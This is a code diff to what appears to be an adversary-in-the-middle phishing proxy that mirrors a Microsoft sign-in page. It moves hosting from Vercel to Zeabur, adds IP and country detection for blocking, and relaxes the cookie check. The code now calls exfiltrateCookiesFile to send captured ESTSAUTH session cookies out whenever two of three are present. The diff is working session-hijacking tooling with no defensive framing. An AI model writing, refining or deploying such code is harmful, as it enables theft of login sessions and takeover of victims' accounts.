@@ -40,9 +40,17 @@ async function exfiltrateCookiesFile(cookieText, ip) {
 async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
   
-  // Get client info from Vercel headers (equivalent to Cloudflare headers)
-  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
-  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
+  // ---- ZEABUR IP/REGION DETECTION (Generic/Standard Headers) ----
+  // Zeabur uses standard proxy headers unlike Vercel's custom ones
+  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() 
+    || request.headers.get('x-real-ip') 
+    || request.headers.get('cf-connecting-ip')
+    || 'unknown';
+  
+  // Try to get country from various possible headers (Cloudflare, etc.)
+  const region = request.headers.get('cf-ipcountry')?.toUpperCase() 
+    || request.headers.get('x-vercel-ip-country')?.toUpperCase() 
+    || '';
 
   // Blocking check
   if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
@@ -53,16 +61,16 @@ async function handleProxy(request, pathSegments = []) {
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
   
-  // Create new URL object for upstream like Cloudflare Worker
-  const upstreamUrl = new URL(request.url);
-  upstreamUrl.protocol = 'https:';
-  upstreamUrl.host = upstream_domain;
-
-  // Handle path like Cloudflare Worker
-  if (upstreamUrl.pathname === '/') {
+  // FIX: Create new URL object from scratch instead of cloning request.url
+  // This prevents Zeabur's port 8080 from leaking into the upstream URL
+  const upstreamUrl = new URL(`https://${upstream_domain}`);
+  
+  // Handle path - use pathname from original request but strip leading slash if needed
+  let pathname = url.pathname;
+  if (pathname === '/') {
     upstreamUrl.pathname = UPSTREAM_PATH;
   } else {
-    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
+    upstreamUrl.pathname = UPSTREAM_PATH + pathname.replace(/^\//, '');
   }
 
   console.log('Proxying to:', upstreamUrl.toString());
@@ -139,8 +147,16 @@ async function handleProxy(request, pathSegments = []) {
     console.error(error);
   }
 
-  // Only exfiltrate if key auth cookies are present
-  if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
+  // ---- UPDATED: Check for 2 of 3 OR 3 of 3 cookies ----
+  const hasEstsAuth = all_cookies.includes('ESTSAUTH');
+  const hasEstsAuthPersistent = all_cookies.includes('ESTSAUTHPERSISTENT');
+  const hasEstsAuthLight = all_cookies.includes('ESTSAUTHLIGHT');
+  
+  // Count how many of the three key cookies are present
+  const cookieCount = [hasEstsAuth, hasEstsAuthPersistent, hasEstsAuthLight].filter(Boolean).length;
+  
+  // Exfiltrate if we have at least 2 of the 3 cookies (2 OR 3)
+  if (cookieCount >= 2) {
     await exfiltrateCookiesFile(all_cookies, ipAddress);
   }
 
